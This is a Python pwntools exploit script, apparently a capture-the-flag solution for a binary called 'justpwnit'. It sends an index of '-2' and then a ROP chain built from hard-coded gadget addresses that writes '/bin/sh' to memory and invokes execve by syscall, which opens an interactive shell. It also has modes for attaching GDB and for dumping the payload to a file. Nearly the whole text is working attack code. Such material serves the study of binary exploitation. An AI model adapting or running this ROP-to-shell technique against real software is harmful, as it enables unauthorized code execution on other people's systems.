import pwn
import sys

# Order of rop gadgets on stack
# | pop rdi:                     0x401b0d
# | writeable address            0x0x40c240
# | pop rax                      0x401001
# | shell string:                "/bin/sh\x00"
# | mov qword [rdi], rax:        0x401ce7
# | pop rax:                     0x401001
# | excecv syscall num:          0x3b
# | pop rsi:                     0x4019a3
# | 0                            0x0
# | pop rdx:                     0x403d23
# | 0                            0x0
# | syscall:                     0x4013e9

# Packed rop gadgets, syscall num, shell string, and 0s
syscall_num = pwn.p64(0x3b)
writeable_addr = pwn.p64(0x40c240)
shell_string = b'/bin/sh\x00'
zero = pwn.p64(0x0)
pop_rax = pwn.p64(0x401001)
pop_rdi = pwn.p64(0x401b0d)
pop_rsi = pwn.p64(0x4019a3)
pop_rdx = pwn.p64(0x403d23)
mov_rax_rdi_addr = pwn.p64(0x401ce7)
syscall = pwn.p64(0x4013e9)

# Payload
pld = zero + pop_rdi + writeable_addr + pop_rax + shell_string + mov_rax_rdi_addr + pop_rax + syscall_num + pop_rsi + zero + pop_rdx + zero + syscall

# Creates process, sends payload, and switches to interactive mode
def ptools():
    p = pwn.process("./justpwnit")
    p.sendline('-2')
    p.sendline(pld)
    p.clean()
    p.interactive()

# Writes payload to file "exp"
def write_to_exp():
    with open("exp", "wb") as f:
        f.write(b"-2\n")
        f.write(pld)

# Runs GDB with pwntools
def p_debug():
    p = pwn.process("./justpwnit")
    pwn.gdb.attach(p)
    p.sendline('-2')
    p.sendline(pld)

# No arguments runs the exploit and switches to interactive
# -g runs the process with gdb 
# Any other argument will write the payload to the file "exp"
if len(sys.argv) > 1:
    if sys.argv[1] == '-g':
        p_debug()
    else:
        write_to_exp()
else:
    ptools()